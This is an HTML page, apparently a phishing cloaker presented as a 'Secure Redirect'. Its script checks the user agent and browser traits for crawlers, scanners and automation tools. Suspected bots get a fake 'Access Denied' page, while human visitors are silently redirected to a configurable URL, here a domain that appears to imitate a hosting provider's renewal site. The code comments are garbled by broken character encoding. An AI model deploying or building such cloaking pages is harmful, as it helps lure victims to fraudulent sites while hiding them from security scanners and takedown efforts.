<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Redirect</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-blue: #1e3a8a;
            --secondary-blue: #3b82f6;
            --accent-cyan: #06b6d4;
            --dark-navy: #0f172a;
            --danger: #ef4444;
            --gray-100: #f1f5f9;
            --gray-800: #1e293b;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, var(--dark-navy) 0%, var(--primary-blue) 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            line-height: 1.6;
        }

        .container {
            width: 100%;
            max-width: 600px;
            padding: 20px;
        }

        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 48px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4);
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, var(--secondary-blue), var(--accent-cyan));
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 32px;
            font-size: 36px;
            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);
        }

        h1 {
            color: var(--gray-800);
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 12px;
        }

        .subtitle {
            color: var(--gray-600);
            font-size: 16px;
            margin-bottom: 24px;
        }

        .security-status {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: var(--gray-100);
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: 500;
            color: var(--gray-800);
            border: 2px solid var(--danger);
        }

        .blocked-card {
            background: linear-gradient(135deg, #fef2f2, #fee2e2);
            border: 2px solid var(--danger);
        }

        .blocked-card h1 {
            color: var(--danger);
        }

        .hidden {
            display: none !important;
        }

        @media (max-width: 640px) {
            .card { padding: 32px 24px; }
            h1 { font-size: 24px; }
        }
    </style>
</head>
<body>
    <!-- Human: Redirect ŸÅŸàÿ±Ÿä (ŸÖÿß ŸÉŸäÿ®ÿßŸÜÿ¥ ŸáÿßÿØ ÿßŸÑÿπŸÜÿµÿ±) -->
    <div id="humanRedirect"></div>

    <!-- Bot: Ÿäÿ¥ŸàŸÅ ŸáÿßÿØ ÿßŸÑÿµŸÅÿ≠ÿ© -->
    <div class="container hidden" id="blockedContainer">
        <div class="card blocked-card">
            <div class="logo" style="background: linear-gradient(135deg, #ef4444, #dc2626);">üö´</div>
            
            <h1>Access Denied</h1>
            <p class="subtitle">Suspicious activity detected</p>
            
            <div class="security-status">
                <span>‚úï</span>
                <span>Bot Detected</span>
            </div>
        </div>
    </div>

    <script>
        // ========== CONFIGURATION ==========
        const TARGET_URL = 'https://ventraip-renewal.com.au/privacy'; // ‚Üê CHANGE THIS TO YOUR TARGET URL

        // ========== BOT DETECTION ==========
        function isBot() {
            const signatures = [
                'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
                'python', 'java', 'scrapy', 'phantomjs', 'selenium',
                'headless', 'puppeteer', 'playwright', 'webdriver'
            ];

            const ua = navigator.userAgent.toLowerCase();
            const hasBotSignature = signatures.some(sig => ua.includes(sig));
            
            const checks = {
                noScreen: window.screen.width === 0 || window.screen.height === 0,
                noPlugins: navigator.plugins.length === 0,
                noLanguages: navigator.languages.length === 0,
                webdriver: navigator.webdriver === true
            };

            const suspiciousCount = Object.values(checks).filter(Boolean).length;
            return hasBotSignature || suspiciousCount >= 2;
        }

        // ========== MAIN ==========
        (function() {
            const botDetected = isBot();

            if (botDetected) {
                // ÿ•ÿ∏Ÿáÿßÿ± ÿµŸÅÿ≠ÿ© ÿßŸÑÿ≠ÿ∏ÿ±
                document.getElementById('blockedContainer').classList.remove('hidden');
            } else {
                // ÿ•ŸÜÿ≥ÿßŸÜ ‚Üí Redirect ŸÅŸàÿ±Ÿä ŸÅŸàÿ±Ÿä
                window.location.replace(TARGET_URL);
            }
        })();
    </script>
</body>
</html>
